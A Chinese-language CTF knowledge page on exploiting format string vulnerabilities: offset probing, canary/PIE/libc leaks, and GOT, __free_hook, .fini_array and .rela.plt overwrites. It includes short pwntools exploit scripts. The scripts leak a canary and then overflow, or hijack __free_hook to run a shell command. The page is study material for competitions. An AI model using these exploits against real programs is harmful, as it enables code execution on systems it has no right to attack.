---
comments: true
---

# 格式化字符串漏洞利用

> PWN · 知识域。printf 家族格式串控制。标签:**32位fmt利用**、**64位fmt利用**、**fmt栈上利用**、**fmt非栈上利用**、**内存信息泄露**。

## 触发特征

- `printf(buf)` / `printf(fmt, args)` 首参可控;`%x` 试探出地址回显。
- 菜单/日志/欢迎语中的用户输入直接进格式函数。

## 基础与判位

- 判断:输入 `%p%p%p` 看返回;偏移确定:`AAAA%6$p`(32 位栈参从 6 起?×86 从第 1 个栈参数;64 位寄存器参 rsi/rdx/rcx/r8/r9 对应 1-5,栈参从 6 起)。
- **32位fmt利用**:`%n` 写 4 字节,逐字节写地址(老经典);两段式(先泄露后写)。
- **64位fmt利用**:地址含 \x00 截断 → 地址放 payload 尾部;`%hn` 半字写减少长度。
- **fmt栈上利用**:改返回地址/ GOT;`%k$n` 直达目标栈槽。

## fmt非栈上利用

- 目标在栈外(GOT/全局/堆):`%n` 写的地址本身从栈槽读 → 先把目标地址"种"到栈上(格式串自身在栈时用字符串头部当指针池)。
- **fmt 非栈上**(格式串不在栈:bss/堆):找寄存器间接链 `%$$` 思路——用栈上残留指针链逐级偏移(链式 `%k$hhn`),或先把真实地址写进栈槽再写。
- scanf 格式串(栈上)覆盖(TUCTF 2017);自定义 printf 注册表覆盖(`printf_function_table`,34C3 CTF 2017)。

## 内存信息泄露

- `%s` 解引用读任意地址(把目标地址放对应栈槽);`%p` 连发扫栈。
- argv[0] 覆写栈崩信息泄露(HITCON CTF 2015:栈溢出 + fmt 混合);`__printf_chk` 下顺序 `%p` 绕过(VolgaCTF 2017)。
- User-Agent 里放格式串一次泄露 PIE+canary(CSAW 2018 / X-MAS CTF 2018 变体)。
- 小 buffer 下地址碎片:null 字节分段注入(FireShell 2019)。

## 写利用流程

1. 泄露:libc/栈/PIE/canary 拿全。
2. 写:GOT 覆盖为 one_gadget/`system`;`__free_hook`(glibc<2.34)写 system,再 free("/bin/sh")。
3. 迁移:改 saved EIP 迁 bss(PlaidCTF 2015);`.fini_array` 写 main 重入循环(Codegate 2016)。
4. 读受限时:`%n` 单次泄露+覆盖一次完成(picoCTF 2017)。

## 变体与防御绕过

- 编码过滤:ROT13 编码后的格式串(SunshineCTF 2018);字符白名单下 `%` 组合穷举。
- 盲 fmt(blind,无回显无反馈):纯 `%n` 写 + 行为判定(→ [其他类型PWN](other-pwn.md) Blind PWN)。
- strlen 整数截断绕长度检查(ASIS CTF Finals 2017);Objective-C `%@` 格式串(SHA2017);ROT13/HTTP UA 变体见上。
- 游戏状态篡改:格式串写存档变量(UTCTF 2026)。

## 工具速查

```python
fmtstr = fmtstr_payload(6, {elf.got['puts']: one_gadget}, write_size='short')
# pwntools fmtstr 自动构造;手算用 %offset$c + %hn
```

## 转向

- 需要泄露后接 ROP → [栈漏洞利用](stack-exploit.md);blind 场景 → [其他类型PWN](other-pwn.md)

## 例题

### 格式串一次泄露 canary + PIE,再溢出打 win

```python
# 偏移定位:x64 下 canary 常在 %39$p、返回地址在 %41$p(64 位程序典型栈布局)
io.sendline(b'%39$p.%41$p')
leak = io.recvline()
canary    = int(leak.split(b'.')[0], 16)
pie_base  = int(leak.split(b'.')[1], 16) - known_offset

# 第二段:溢出时原样带回 canary,返回地址改 win
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(pie_base + win_offset)
io.sendline(payload)
```

偏移不是背的:用 `AAAABBBB.%p.%p...` 数 `0x41414141...` 出现位置。

### `__free_hook` 覆写(Full RELRO + glibc < 2.34,PascalCTF 2026)

GOT 不可写时,格式串打 `__free_hook`:关键在 `free(ptr)` 把 ptr 放 rdi 当第一参数——`__free_hook = system` 后 `free("cat flag")` 即 `system("cat flag")`:

```python
# 1. 泄露 libc(__libc_start_main 返回地址,偏移按版本查)
p.sendline(b'%43$p')
libc_base = int(p.recvline(), 16) - LIBC_START_MAIN_RET_OFFSET

# 2. 格式串写入 system 到 __free_hook
free_hook   = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
p.sendline(fmtstr_payload(8, {free_hook: system_addr}, write_size='byte'))

# 3. 触发:菜单输入直接发命令字符串,程序 free(input) 时执行
p.sendline(b'cat flag')
```

适用判定:Full RELRO(禁 GOT 写)+ glibc < 2.34(钩子还在);≥ 2.34 钩子被移除 → 转返回地址或 `_IO_FILE` 体系(→ [堆漏洞利用](heap-exploit.md) House of Apple 2)。

### GOT 地址含坏字节:.rela.plt/.dynsym 重定向

GOT 地址带 `\x0a`(fgets 场景)无法直接写时:改 `.rela.plt` 重定位项的符号索引指向另一 `.dynsym` 条目,再把该符号的 `st_value` 写成 `win()`——动态链接器下次调用按被改链跳转,完全绕开对 GOT 的写。

```python
# readelf -S 拿地址;三次格式串写:
# 1) %hhn 写 r_info 低位字节 = 目标符号索引(如 0x0b)
# 2) %hn 写 .dynsym[11].st_value 低 16 位 = win 低位
# 3) %hn 写 st_value+2 高 16 位 = win 高位
```
